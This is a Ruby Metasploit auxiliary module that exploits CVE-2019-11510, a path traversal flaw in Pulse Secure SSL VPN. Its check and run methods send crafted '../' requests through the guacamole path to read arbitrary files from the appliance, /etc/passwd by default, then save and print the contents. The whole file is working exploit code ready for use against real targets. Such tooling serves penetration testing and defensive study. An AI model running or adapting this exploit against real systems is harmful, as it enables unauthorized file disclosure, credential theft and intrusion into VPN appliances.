##
# This module requires Metasploit: https://Metasploit.com/download
#
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Post::File


  def initialize(info = {})
    super(update_info(info,
     'Name'           => 'Pulse Secure SSL VPN guacamole Path Traversal',
     'Description'    => %q{
        Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests.
        This exploit reads the specified file, and displays it.
        This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4
      },
      'References'     =>
          [
              [ 'CVE', '2019-11510'],
          ],
          'Author'         => [
            'Alyssa Herrera', # Proof of Concept
            'Justin Wagner',  # 0xDezzy - Metasploit
            'Orange Tsai'     # Discovery
          ],
      'License'        => MSF_LICENSE,
  ))

      register_options(
      [
        Opt::RPORT(443),
        OptString.new('FILE', [ '/etc/passwd',  "Define the remote file to view, ex:/etc/passwd", '/etc/passwd']),
      ])

  end

  def check
    #Tests to see if it can get /etc/passwd. If it can, it's vulnerable
    uri = '/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'

    print_good("Checking target...")
    res = send_request_raw({
      'method' => 'GET',
      'uri' => uri
      })

    unless res && res.code ==200
      return Exploit::CheckCode::Safe
    end

    Exploit::CheckCode::Vulnerable
  end

  def run

    uri = '/dana-na/../dana/html5acc/guacamole/'
    file = datastore['FILE']
    payload = "../../../../../..#{file}?/dana/html5acc/guacamole/"

    print_status("Starting Exploit...")

    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => uri + payload,
      },1395)

      if res.nil?
        print_error("Connection timed out")
        return
      end

      if (res.code == 200)
        print_good("Target is Vulnerable!")
        data = res.body
        current_host = datastore['RHOST']
        filename = "msf_sslwebsession_"+current_host+".bin"
        File.delete(filename) if File.exist?(filename)
        file_local_write(filename, data)
        print_good("Parsing file.......")
        parse()
      else
        if(res && res.code == 404)
          print_error("Target not Vulnerable or Invalid File Path")
        else
          print_error("Ooof, try again...")
        end
      end
    end

    def parse()
      current_host = datastore['RHOST']
      fileObj = File.new("msf_sslwebsession_"+current_host+".bin", "r")
      #fileObj = store_loot("msf_sslwebsession.bin", 'plain/text', "msf_sslwebsession.bin", 'Downloaded file from pulse secure')
      words = 0
      while (line = fileObj.gets)
        printable_data = line.gsub(/[^[:print:]]/, '.')
        array_data = printable_data.scan(/.{1,60}/m)
        for ar in array_data
          if ar != "............................................................"
            print_good(ar)
          end
        end
    end
    fileObj.close
  end
end
